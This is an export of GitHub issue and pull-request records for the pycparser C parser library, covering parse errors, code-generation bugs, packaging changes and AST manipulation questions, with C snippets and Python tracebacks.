eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/258,324621424,MDU6SXNzdWUzMjQ2MjE0MjQ=,258,Install examples/* binary with pycparser package,1629419,closed,FALSE,NA,NA,1,2018-05-19T11:01:52Z,2018-05-21T13:16:22Z,2018-05-21T13:16:22Z,CONTRIBUTOR,NA,"Hi,

I have a use case where i need to use the c_json binary example to convert c to json using pycparser.
But at the moment, examples are not installed so i have to use pycparser from the git source tree which is not very conveniant for the future users of my package.

I have forked this repository and made some changes for the examples to be installed and be more user friendly.

Would you be ok if i open some merge request ?

Thank you for reading me !",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/258/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/258/comments,https://api.github.com/repos/eliben/pycparser/issues/258/events,https://github.com/eliben/pycparser/issues/258,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/257,321452749,MDU6SXNzdWUzMjE0NTI3NDk=,257,Cast to struct as pointer,13505501,closed,FALSE,NA,NA,4,2018-05-09T06:58:54Z,2019-03-14T20:15:48Z,2019-03-14T20:15:47Z,NONE,NA,"I tried to parse some C code with pycparser. Therefore I ran gcc with the option ""-E"" to preprocess the code. The result text shall be parsed with pycparser:
```
source_code = self._preProcess()
parser = c_parser.CParser()
ast = parser.parse(source_code, filename='<none>')
```
The following preprocessed C code is parsed well:
```
struct DB_MappingStruct
{ unsigned short ID;
  unsigned short ObsNr;
  unsigned short Index;
  unsigned char Typ;
  unsigned char SubIndex;
  unsigned short NovAdr;
};

typedef struct DB_MappingStruct DB_ObjectTyp;
...
extern DB_ObjectTyp *DB_CallingSignal;
...
unsigned int REQUEST_Check(DB_ObjectTyp *p);
```

... but these code fragments are raising the exception `pycparser.plyparser.ParseError: <none>:3119:32: before: *`:
```
unsigned int ((DB_ObjectTyp *) &DB_Object[214]);
...
if ((((DB_ObjectTyp *) &DB_Object[214]) = DB_Uint(E1_BP_SollRate)) == 0)
   {
   ...
```
I think it's a problem with the cast to the struct `DB_ObjectTyp` as pointer, because the `*` is interpreted as operator `t_TIMES` in ""ctokens.py"".",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/257/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/257/comments,https://api.github.com/repos/eliben/pycparser/issues/257/events,https://github.com/eliben/pycparser/issues/257,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/256,318131219,MDU6SXNzdWUzMTgxMzEyMTk=,256,RuntimeError: Unable to invoke 'cpp'.  Make sure its path was passed correctly,32939855,closed,FALSE,NA,NA,1,2018-04-26T17:43:39Z,2018-04-26T18:14:24Z,2018-04-26T18:14:24Z,NONE,NA,"I recently install pycparser using pip install , when i tried this snipped:

`from pycparser import c_ast, parse_file
class FuncCallVisitor(c_ast.NodeVisitor):
    def visit_FuncCall(self, node):
        print(""{} called at {}"".format(node.name.name, node.name.coord))
ast = parse_file(r""C:\my_file_to_parse.c"", use_cpp=True)`

i got this error:

`Traceback (most recent call last):
  File ""<pyshell#3>"", line 1, in <module>
    ast = parse_file(r""C:\my_file_to_parse.c"", use_cpp=True)
  File ""C:\Python27\lib\site-packages\pycparser\__init__.py"", line 86, in parse_file
    text = preprocess_file(filename, cpp_path, cpp_args)
  File ""C:\Python27\lib\site-packages\pycparser\__init__.py"", line 49, in preprocess_file
    ('Original error: %s' % e))
RuntimeError: Unable to invoke 'cpp'.  Make sure its path was passed correctly
Original error: [Error 2] The system cannot find the file specified`


what is that `cpp` file and from where i shuld get it???
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/256/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/256/comments,https://api.github.com/repos/eliben/pycparser/issues/256/events,https://github.com/eliben/pycparser/issues/256,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/255,317963736,MDExOlB1bGxSZXF1ZXN0MTg0MjkwODM2,255,Fix non-generated constant expressions in designated initializers (#246),13061643,closed,FALSE,NA,NA,1,2018-04-26T10:13:25Z,2018-04-26T12:07:09Z,2018-04-26T12:07:09Z,CONTRIBUTOR,NA,Adds a visitor call on non-`ID` names in `CGenerator.visit_NamedInitializer` (Fix #246).,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/255/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/255/comments,https://api.github.com/repos/eliben/pycparser/issues/255/events,https://github.com/eliben/pycparser/pull/255,https://api.github.com/repos/eliben/pycparser/pulls/255
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/254,317950377,MDExOlB1bGxSZXF1ZXN0MTg0MjgwNTQz,254,Add support for empty struct (#66),13061643,closed,FALSE,NA,NA,3,2018-04-26T09:36:26Z,2019-02-13T13:46:46Z,2018-04-28T03:09:25Z,CONTRIBUTOR,NA,"Support empty `struct` in parser and c generator.

Though not allowed by C99, empty `struct`s can be found in android headers.
(Look for `__bionic_zero_size_is_okay_t` in android code).

Note: 
Issue #66 was closed because the original poster found a workaround. 
As @eliben welcomed pull requests in comments, #66 could be reopened/reclosed as fixed.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/254/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/254/comments,https://api.github.com/repos/eliben/pycparser/issues/254/events,https://github.com/eliben/pycparser/pull/254,https://api.github.com/repos/eliben/pycparser/pulls/254
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/253,316012748,MDU6SXNzdWUzMTYwMTI3NDg=,253,Incorrect Parsing of Floating Point Literals,25016959,closed,FALSE,NA,NA,4,2018-04-19T19:38:43Z,2019-05-02T10:26:27Z,2018-08-31T13:03:43Z,CONTRIBUTOR,NA,"Currently, the floating point literal
```
double f = 4.5;
```
is parsed to 
```
Decl: f, [], [], []
  TypeDecl: f, []
    IdentifierType: ['double']
  Constant: float, 4.5
```
when really, the `type` attribute of the `Constant` node should be ""double"". Likewise, 
```
double f = 4.5L;
```
is parsed to 
```
Decl: f, [], [], []
  TypeDecl: f, []
    IdentifierType: ['double']
  Constant: float, 4.5L
```
when the `type` attribute of the `Constant` node should be ""long double"".  Note that the declared type is not what matters, it is the parsing of the floating point literal. ",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/253/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/253/comments,https://api.github.com/repos/eliben/pycparser/issues/253/events,https://github.com/eliben/pycparser/issues/253,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/252,313703783,MDU6SXNzdWUzMTM3MDM3ODM=,252,Unable to parse provided examples,1360637,closed,FALSE,NA,NA,2,2018-04-12T12:23:33Z,2019-02-10T01:48:16Z,2018-04-12T12:43:22Z,NONE,NA,"I haven't been able to successfully parse any of the provided examples (that I've tried).

For example:

**func_calls.py**

```
[14:14:58] jhh ~/Downloads/pycparser-master
$ python3 examples/func_calls.py 
Traceback (most recent call last):
  File ""examples/func_calls.py"", line 46, in <module>
    show_func_calls(filename, func)
  File ""examples/func_calls.py"", line 33, in show_func_calls
    ast = parse_file(filename, use_cpp=True)
  File ""./pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""./pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""./pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""./pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""./pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""./pycparser/c_parser.py"", line 1819, in p_error
    column=self.clex.find_tok_column(p)))
  File ""./pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: examples/c_files/hash.c:51:5: before: /
```

This was right after downloading current master (https://github.com/eliben/pycparser/commit/902500d126d4732160c46fe525e41c017864f271), without installing.

Same issue occurs after installing to `site-packages`:

```
[14:16:30] jhh ~/Downloads/pycparser-master
$ python3 examples/func_calls.py 
Traceback (most recent call last):
  File ""examples/func_calls.py"", line 46, in <module>
    show_func_calls(filename, func)
  File ""examples/func_calls.py"", line 33, in show_func_calls
    ast = parse_file(filename, use_cpp=True)
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/c_parser.py"", line 1819, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: examples/c_files/hash.c:51:5: before: /
```

**func_defs.py**

```
[14:29:19] jhh ~/Downloads/pycparser-master
$ python3 examples/func_defs.py 
In file included from examples/c_files/memmgr.c:8:
examples/c_files/memmgr.h:37:7: warning: missing terminating ' character [-Winvalid-pp-token]
// you'll probably want to keep those undefined, because
      ^
examples/c_files/memmgr.h:96:8: warning: extra tokens at end of #endif directive [-Wextra-tokens]
#endif // MEMMGR_H
       ^
       //
examples/c_files/memmgr.c:97:56: warning: missing terminating ' character [-Winvalid-pp-token]
    // that if nbytes is a multiple of nquantas, we don't allocate too much
                                                       ^
examples/c_files/memmgr.c:119:28: warning: missing terminating ' character [-Winvalid-pp-token]
                // its prev's next to its next
                           ^
4 warnings generated.
Traceback (most recent call last):
  File ""examples/func_defs.py"", line 46, in <module>
    show_func_defs(filename)
  File ""examples/func_defs.py"", line 34, in show_func_defs
    cpp_args=r'-Iutils/fake_libc_include')
  File ""./pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""./pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""./pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""./pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""./pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""./pycparser/c_parser.py"", line 1819, in p_error
    column=self.clex.find_tok_column(p)))
  File ""./pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: examples/c_files/memmgr.c:1:1: before: /
```

This system (MacOS) is using Python 3.5.2.

**EDIT:**

Ok, so I should have done some trivial searching before making this issue. I'm experiencing the exact same as #234.

What fixes it is using either `clang -E` or `gcc` instead of `cpp`:

```
ast = parse_file(filename, use_cpp=True,
                     cpp_path='clang', 
                     cpp_args=['-E', r'-Iutils/fake_libc_include'])
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/252/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/252/comments,https://api.github.com/repos/eliben/pycparser/issues/252/events,https://github.com/eliben/pycparser/issues/252,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/251,313618502,MDU6SXNzdWUzMTM2MTg1MDI=,251,Installation on Python 3.7 raises ValueError: bad marshal data (unknown type code),705404,closed,FALSE,NA,NA,9,2018-04-12T08:06:08Z,2021-04-24T01:49:30Z,2019-08-26T22:15:17Z,NONE,NA,"When installing on Python ""nightly"" on Travis-CI, I see this error:

    ValueError: bad marshal data (unknown type code)

For the full output see https://travis-ci.org/bastibe/SoundFile/jobs/365467380.

I searched a bit for the error message, and the recommended solutions suggest to remove `.pyc` files.

Since the `pycparser` tarball contains `.pyc` files, I guess the error has something to do with them.

But I really don't know, it might be something completely different.

Probably related: #135",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/251/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/251/comments,https://api.github.com/repos/eliben/pycparser/issues/251/events,https://github.com/eliben/pycparser/issues/251,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/250,313155549,MDExOlB1bGxSZXF1ZXN0MTgwNzc3NDU4,250,Add additional trove classifiers to setup.py,347634,closed,FALSE,NA,NA,0,2018-04-11T02:52:35Z,2018-06-26T23:22:42Z,2018-04-11T13:45:31Z,CONTRIBUTOR,NA,"- Document project as stable, ready for use in production environments
- Document project license

Helps library users know these values at a glance. These classifiers are displayed on the PyPI page:

https://pypi.python.org/pypi/pycparser

For a complete list of trove classifiers, see:

https://pypi.python.org/pypi?%3Aaction=list_classifiers",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/250/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/250/comments,https://api.github.com/repos/eliben/pycparser/issues/250/events,https://github.com/eliben/pycparser/pull/250,https://api.github.com/repos/eliben/pycparser/pulls/250
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/249,313154702,MDExOlB1bGxSZXF1ZXN0MTgwNzc2ODI0,249,Include license file in the generated wheel package,347634,closed,FALSE,NA,NA,0,2018-04-11T02:47:03Z,2018-06-26T23:22:43Z,2018-04-11T13:44:46Z,CONTRIBUTOR,NA,"The wheel package format supports including the license file. This is done using the `[metadata]` section in the `setup.cfg` file. For additional information on this feature, see:

https://wheel.readthedocs.io/en/stable/index.html#including-the-license-in-the-generated-wheel-file

Helps package comply with its own license:

> * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
> * Redistributions in binary form must reproduce the above copyright notice,   this list of conditions and the following disclaimer in the documentation   and/or other materials provided with the distribution.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/249/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/249/comments,https://api.github.com/repos/eliben/pycparser/issues/249/events,https://github.com/eliben/pycparser/pull/249,https://api.github.com/repos/eliben/pycparser/pulls/249
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/248,313055183,MDU6SXNzdWUzMTMwNTUxODM=,248,Pragma in for loop without compound statement,2356965,closed,FALSE,NA,NA,4,2018-04-10T19:17:30Z,2018-04-25T18:26:42Z,2018-04-25T18:26:42Z,NONE,NA,"````````
int i;
for (i = 0; i < 10; ++i)
  #pragma something
  a[i]=i;
````````
It regards `#pragma` as a statement and `a[i]=i` is a statementment at the same level with the for loop.
However semantically, it should be a compound statement.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/248/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/248/comments,https://api.github.com/repos/eliben/pycparser/issues/248/events,https://github.com/eliben/pycparser/issues/248,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/247,313051453,MDU6SXNzdWUzMTMwNTE0NTM=,247,AST Mutator?,2356965,closed,FALSE,NA,NA,1,2018-04-10T19:05:46Z,2018-04-11T19:30:11Z,2018-04-11T19:30:11Z,NONE,NA,"I am writing some codes to manipulate the AST but I found there is no easy way to reform the AST structure dramatically (like injecting statements).

Shall I write some default AST Mutator so that it will be easier to manipulate the AST contents?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/247/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/247/comments,https://api.github.com/repos/eliben/pycparser/issues/247/events,https://github.com/eliben/pycparser/issues/247,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/246,309267883,MDU6SXNzdWUzMDkyNjc4ODM=,246,Constant expressions in designated initializers are not generated back to C,13061643,closed,FALSE,NA,NA,0,2018-03-28T08:29:33Z,2018-04-26T12:07:09Z,2018-04-26T12:07:09Z,CONTRIBUTOR,NA,"While pycparser correctly parses a constant-expression in a designated initializer (the AST is correct), it fails to write it back when generating C code.

Consider the following code:
```C
void myFunction(void)
{
  int array[3] = {[0] = 0, [1] = 1, [1+1] = 2};
}
```
Parsing it, then using `CGenerator` to generate the source produces:
```C
void myFunction(void)
{
  int array[3] = {[0] = 0, [1] = 1, = 2};
}
```

The C99 grammar describes the designator part of designated initializers as:
```ebnf
designator: [ constant-expression ]
            . identifier
```
(See §6.7.8 in http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf)

The ```CGenerator.visit_NamedInitializer``` currently only considers the `ID` and `Constant` types.
The `Constant` branch should either be extended to other types or be an `else:` branch.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/246/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/246/comments,https://api.github.com/repos/eliben/pycparser/issues/246/events,https://github.com/eliben/pycparser/issues/246,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/245,308685150,MDExOlB1bGxSZXF1ZXN0MTc3NTI5NjYy,245,Fixing redefinition in Fake Headers.,25016959,closed,FALSE,NA,NA,0,2018-03-26T18:29:04Z,2018-03-28T18:48:50Z,2018-03-28T18:48:49Z,CONTRIBUTOR,NA,"Currently, both `_fake_typedefs.h` and `_fake_defines.h` define `__builtin_va_list` and `va_list`.
A case could be made for having them in either file. I don't really care which file they are defined in, I just don't want it to be in both of them, because its a redefinition error.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/245/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/245/comments,https://api.github.com/repos/eliben/pycparser/issues/245/events,https://github.com/eliben/pycparser/pull/245,https://api.github.com/repos/eliben/pycparser/pulls/245
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/244,308249508,MDU6SXNzdWUzMDgyNDk1MDg=,244,AST manipulation (question),5926801,closed,FALSE,NA,NA,1,2018-03-24T10:43:49Z,2018-03-24T12:12:09Z,2018-03-24T12:12:08Z,NONE,NA,"Hi,
I'm implementing functions for AST manipulation. With my limited exposure to both python and your library, I am finding it difficult to implement subtree insertion and deletion. I looked at the your rewrite AST example.

`assign = ast.ext[0].body.block_items[0]`
`assign.lvalue.name = ""y""`
`assign.rvalue.value = 2`

This is easy when you know the exact position. But how to do it systematically? More specifically, lets say if I want to delete node number 8 (counted by preorder traversal), how do I do it?
I could get the path using a recursive solution to the node but the solution doesn't seem to be neat.
Any suggestions are welcome.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/244/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/244/comments,https://api.github.com/repos/eliben/pycparser/issues/244/events,https://github.com/eliben/pycparser/issues/244,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/243,305751805,MDExOlB1bGxSZXF1ZXN0MTc1NDAzNzI4,243,Fixed enum formatting in generating C code (issue #240).,25016959,closed,FALSE,NA,NA,1,2018-03-15T23:18:12Z,2018-03-19T13:50:19Z,2018-03-16T20:16:23Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/243/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/243/comments,https://api.github.com/repos/eliben/pycparser/issues/243/events,https://github.com/eliben/pycparser/pull/243,https://api.github.com/repos/eliben/pycparser/pulls/243
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/242,305611322,MDU6SXNzdWUzMDU2MTEzMjI=,242,Generated code not compiling with typedef named struct defining multiple types,13061643,closed,FALSE,NA,NA,2,2018-03-15T15:51:39Z,2018-03-15T22:07:32Z,2018-03-15T22:07:32Z,CONTRIBUTOR,NA,"When using a single `typedef struct` that defines multiple types, the parser converts the source to multiple single-type `typedef` nodes.
This causes problems when using a named `struct`.

For example:
```c
typedef struct MyStruct {
  int a;
} myType, *pMyType;
```
compiles correctly.

However, once parsed, and written back to C source, we get:
```c
typedef struct MyStruct {
  int a;
} myType;
typedef struct MyStruct {
  int a;
} *pMyType;
```
This does not compile, as `struct MyStruct` is defined twice.
```
error: redefinition of MyStruct
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/242/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/242/comments,https://api.github.com/repos/eliben/pycparser/issues/242/events,https://github.com/eliben/pycparser/issues/242,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/241,304190245,MDExOlB1bGxSZXF1ZXN0MTc0MjQwMTcw,241,Add fake-defines for C99 format macro constants. This closes #89.,23284528,closed,FALSE,NA,NA,1,2018-03-11T20:20:56Z,2018-03-12T12:38:45Z,2018-03-12T12:38:45Z,CONTRIBUTOR,NA,"This is a simple patch to the fake_libc_include header files that adds placeholder PRI* and SCN* macro definitions, typically defined in C99's inttypes.h header file. This closes #89.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/241/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/241/comments,https://api.github.com/repos/eliben/pycparser/issues/241/events,https://github.com/eliben/pycparser/pull/241,https://api.github.com/repos/eliben/pycparser/pulls/241
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/240,303322329,MDU6SXNzdWUzMDMzMjIzMjk=,240,Valueless enum members are generated incorrectly,3268059,closed,FALSE,NA,NA,6,2018-03-08T01:27:06Z,2019-06-07T22:16:53Z,2019-06-07T22:16:53Z,CONTRIBUTOR,NA,"This seems to have been introduced by #216, which inadvertently removed some special-case checks. Enum members that don't have an assigned value now generate an invalid, empty assignment. For example:
```
typedef enum MOT_TravelModes
{
  MOT_TravelModeUndefined = ,
  MOT_Linear = 0x01,
  MOT_Rotational = 0x02
} MOT_TravelModes;
```
In the original code, `MOT_TravelModeUndefined` was assigned no value, and should be generated with no `=` sign.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/240/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/240/comments,https://api.github.com/repos/eliben/pycparser/issues/240/events,https://github.com/eliben/pycparser/issues/240,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/239,302614330,MDU6SXNzdWUzMDI2MTQzMzA=,239,ParseError: Objectffly\SerDb.i:43:18: before: __loff_t,18283933,closed,FALSE,NA,NA,1,2018-03-06T08:58:45Z,2018-03-06T13:08:11Z,2018-03-06T13:08:11Z,NONE,NA,"Hi I am getting the following error print:

Traceback (most recent call last):
  File ""C:\Work\RE\Tools\VarsExporter\BuildExportedDb.py"", line 1076, in <module>
    main()
  File ""C:\Work\RE\Tools\VarsExporter\BuildExportedDb.py"", line 1032, in main
    ast = parse_file(i_file)
  File ""C:\Python27\lib\site-packages\pycparser\__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 1761, in p_error
    column=self.clex.find_tok_column(p)))
  File ""C:\Python27\lib\site-packages\pycparser\plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
ParseError: Objectffly\SerDb.i:43:18: before: __loff_t

What causes the above issue? How Can I handle it?
Maybe preprocess the .i file?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/239/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/239/comments,https://api.github.com/repos/eliben/pycparser/issues/239/events,https://github.com/eliben/pycparser/issues/239,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/238,302281684,MDU6SXNzdWUzMDIyODE2ODQ=,238,'At end of input error',18283933,closed,FALSE,NA,NA,4,2018-03-05T12:29:35Z,2018-03-08T14:21:00Z,2018-03-08T14:21:00Z,NONE,NA,"I am trying to parse .i file and getting the following error:
Traceback (most recent call last):

  File ""C:/Work/REL_06_02_00_10_exception_after_CFUN_0/Tools/VarsExporter/BuildExportedDb.py"", line 1076, in <module>
UNHANDELED EXCEPTION: BuildExportedDb.py
    main()

  File ""C:/Work/REL_06_02_00_10_exception_after_CFUN_0/Tools/VarsExporter/BuildExportedDb.py"", line 1032, in main
    ast = parse_file(i_file)
  File ""C:\Python27\lib\site-packages\pycparser\__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 1763, in p_error
    self._parse_error('At end of input', self.clex.filename)
  File ""C:\Python27\lib\site-packages\pycparser\plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
ParseError: Obj\ServiceDb.i: At end of input

Any suggestions how can I debug it, and find out what's going on?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/238/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/238/comments,https://api.github.com/repos/eliben/pycparser/issues/238/events,https://github.com/eliben/pycparser/issues/238,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/237,301885180,MDU6SXNzdWUzMDE4ODUxODA=,237,Add parsing of pass-by-reference parameters,3268059,closed,FALSE,NA,NA,2,2018-03-02T19:52:46Z,2018-03-07T22:30:27Z,2018-03-07T22:30:27Z,CONTRIBUTOR,NA,"I know this is a C++ feature, but the patch required is only 2 lines, so I thought I'd check.

I often encounter headers written for MSVC that are mostly C, with the occasional C++-ism. I usually do some preprocessing to normalize them before sending to pycparser, but this is pretty difficult to do for the pass-by-reference syntax without essentially writing a parser.

What I'd like to do is to simply interpret pass-by-reference as pass-by-pointer (e.g. parse `func(int &x);` as `func(int *x);`. This can be done by adding two lines to the `pointer` production so that it reads:

```
pointer : TIMES type_qualifier_list_opt
        | TIMES type_qualifier_list_opt pointer
        | AND type_qualifier_list_opt
        | AND type_qualifier_list_opt pointer
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/237/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/237/comments,https://api.github.com/repos/eliben/pycparser/issues/237/events,https://github.com/eliben/pycparser/issues/237,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/236,301588506,MDExOlB1bGxSZXF1ZXN0MTcyMzc1NzU1,236,Fix #235: Pragma displacing real statements,22032832,closed,FALSE,NA,NA,3,2018-03-01T22:45:54Z,2018-03-03T13:18:27Z,2018-03-03T13:18:27Z,CONTRIBUTOR,NA,I apologize if this is terribly naive but I believe this should take care of #235 by wrapping pragma's and the directly following statement in a Compound. As discussed in #235 this is kind of weird but appears to be the best way to ensure (mostly) correct AST structure in these cases.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/236/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/236/comments,https://api.github.com/repos/eliben/pycparser/issues/236/events,https://github.com/eliben/pycparser/pull/236,https://api.github.com/repos/eliben/pycparser/pulls/236
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/235,299096221,MDU6SXNzdWUyOTkwOTYyMjE=,235,Incorrect AST Structure when #pragma follows For loop.,25016959,closed,FALSE,NA,NA,4,2018-02-21T19:24:24Z,2018-03-03T13:18:28Z,2018-03-03T13:18:28Z,CONTRIBUTOR,NA,"Consider the following code snippet: 
```c
for(int i = 0; i < 3; i++)
    #pragma omp critical
        sum += 1;
```
When compiled without Open MP, the #pragma should be ignored completely, so that the statement ``sum += 1`` should be a descendent of the for loop. However, in the current implementation of pycparser, it is parsed a _sibling_ of the for loop, instead of as a descendant. 
```
For: 
  DeclList: 
    Decl: i, [], [], []
      TypeDecl: i, []
        IdentifierType: ['int']
      Constant: int, 0
  BinaryOp: <
    ID: i
    Constant: int, 3
  UnaryOp: p++
    ID: i
  Pragma: omp critical
Assignment: +=
  ID: sum
  Constant: int, 1
```

The same problem applies to other loops, Labels, and If statements, as in the following:
```c
for(int i = 0; i < 3; i++)
    myLabel:
    #pragma omp critical
        sum += 1;
```
```c
while(sum < 100)
